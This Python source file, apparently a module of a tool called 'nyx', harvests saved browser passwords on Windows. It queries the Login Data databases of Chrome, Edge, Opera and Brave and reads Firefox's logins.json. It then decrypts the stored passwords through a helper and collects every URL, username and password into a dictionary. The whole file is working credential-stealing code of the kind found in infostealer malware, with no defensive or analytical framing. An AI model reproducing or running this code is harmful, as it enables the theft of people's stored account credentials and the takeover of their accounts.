# nyx/modules/browser_credentials.py
import os
import sqlite3
import json
from nyx.utils import decrypt, logger
from config import ALLOWED_EXTENSIONS

def get_browser_credentials():
    credentials = {}
    browsers = {
        "Chrome": os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
        "Edge": os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"),
        "Opera": os.path.expanduser(r"~\AppData\Roaming\Opera Software\Opera Stable\Login Data"),
        "Brave": os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"),
    }

    for browser, db_path in browsers.items():
        if os.path.exists(db_path):
            try:
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                query = """SELECT origin_url, username_value, password_value FROM logins"""
                cursor.execute(query)

                credentials[browser] = {}
                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    password = decrypt.decrypt_password(encrypted_password) if encrypted_password else "No password"

                    if origin_url not in credentials[browser]:
                        credentials[browser][origin_url] = []
                    credentials[browser][origin_url].append({"username": username, "password": password})

                conn.close()
                display_message(f"✅ Credential Summary Updated For {browser}.")
            except Exception as e:
                display_message(f"❌ Error Updating {browser} Credentials: {e}", "error")
        else:
            display_message(f"❌ {browser} Credential Database not found:", "error")

    credentials['Firefox'] = get_firefox_credentials()
    if credentials['Firefox']:
        display_message("✅ Credential Summary Updated For Firefox.")
    else:
        display_message("❌ Credential Database not found for Firefox or path not accessible.", "error")

    return credentials

def get_firefox_credentials():
    credentials = {}
    firefox_profile_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles")

    if not os.path.exists(firefox_profile_path):
        display_message("❌ Firefox Profile Path Not Found:", "error")
        return credentials

    profiles = [
        d for d in os.listdir(firefox_profile_path)
        if d.endswith(".default-release") or d.endswith(".default")
    ]

    for profile in profiles:
        logins_path = os.path.join(firefox_profile_path, profile, "logins.json")
        if os.path.exists(logins_path):
            with open(logins_path, "r", encoding="utf-8") as f:
                logins = json.load(f)
                for login in logins["logins"]:
                    url = login["hostname"]
                    username = login["username"]
                    encrypted_password = login["encryptedPassword"]
                    password = decrypt.decrypt_password(encrypted_password)
                    if url not in credentials:
                        credentials[url] = []
                    credentials[url].append({"username": username, "password": password})

    return credentials

def display_message(message, level="info"):
    if level == "info":
        print(f"[+] {message}")
    elif level == "warning":
        print(f"[!] {message}")
    elif level == "error":
        print(f"[-] {message}")
